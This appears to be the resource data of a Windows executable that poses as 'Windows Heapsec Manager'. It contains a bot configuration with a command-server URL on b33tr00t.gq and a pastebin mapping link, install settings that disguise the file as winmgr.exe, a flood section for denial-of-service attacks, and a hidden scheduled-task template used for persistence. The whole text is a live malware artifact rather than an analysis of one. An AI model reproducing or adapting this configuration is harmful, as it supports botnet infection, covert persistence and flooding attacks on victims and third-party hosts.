        ??  ??                  ?      ?? ??               ?4   V S _ V E R S I O N _ I N F O     ???                ?                           S t r i n g F i l e I n f o   ?   0 4 0 9 0 4 E 4   X   F i l e D e s c r i p t i o n     W i n d o w s   H e a p s e c   M a n a g e r   4   P r o d u c t V e r s i o n   0 . 0 . 0 . 0      C o m m e n t s       $   C o m p a n y N a m e         4 	  F i l e V e r s i o n     2 . 1 7 . 2 . 0     $   I n t e r n a l N a m e       (   L e g a l C o p y r i g h t       ,   L e g a l T r a d e m a r k s         ,   O r i g i n a l F i l e n a m e       $   P r o d u c t N a m e         D    V a r F i l e I n f o     $    T r a n s l a t i o n     	??  0   ??
 S E T T I N G S                   [General]
FirstRun=0
InfectedBy=Raffy
Server=http://b33tr00t.gq:57601
SecMapping=http://pastebin.com/raw/zkpvfptq
Delay=5000
Mutex=51E7DB3A-CEBF-4136-85D2-22FDF44DAD29

[Install]
Prefix=Doctor-
BaseName=Plague
BaseLocation=Temporary Directory
InternalName=winmgr.exe
Startup=0

[Flood]
DefaultIP=1.1.1.1
DefaultPort=80
Message=My dreaming ends... Your nightmare begins!
MaxPower=0
   ?  ,   ??
 N E W T A S K                 <?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{DATE_TIME}</Date>
    <Author>{USERNAME}</Author>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT{INTERVAL}</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>{START_DATE_TIME}</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{COMPUTER_NAME}\{USERNAME}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{COMMAND}</Command>
    </Exec>
  </Actions>
</Task>